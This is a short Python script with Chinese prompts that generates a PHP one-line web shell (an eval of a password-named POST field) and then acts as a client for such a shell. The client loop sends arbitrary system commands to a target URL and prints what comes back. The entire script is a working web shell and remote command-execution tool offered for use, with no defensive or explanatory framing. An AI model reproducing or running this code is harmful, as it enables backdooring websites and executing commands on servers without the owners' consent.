import requests
import os
print('1)php一句话木马生成   2)连接木马')
number = input('请选择>')
if number == '':
      print('[-]错误')
else:
    if int(number) == 1:
        password = input('木马密码>')
        f = open('shell.txt','w')
        f.write("<?php @eval($_POST['")
        f.write(password)
        f.write("']); ?>")
        f.close()
        os.rename('shell.txt','php.php')
        print('[*]生成完毕')
    else:
        url = input('网址>')
        shell = input('木马路径>')
        passwd = input('木马的密码>')
        port = input('网站端口(回车默认80)>')
        print('[*]以连接')
        if port == '':
            pass
        while True:
            cmd = input('shell >')

            POST = "system(\'"+ cmd +" \');"
            payload={
                passwd:POST
            }
            url1=url+':'+port+shell
            print(url1)
            response=requests.post(url1,payload,timeout=10)
            print(response.text)

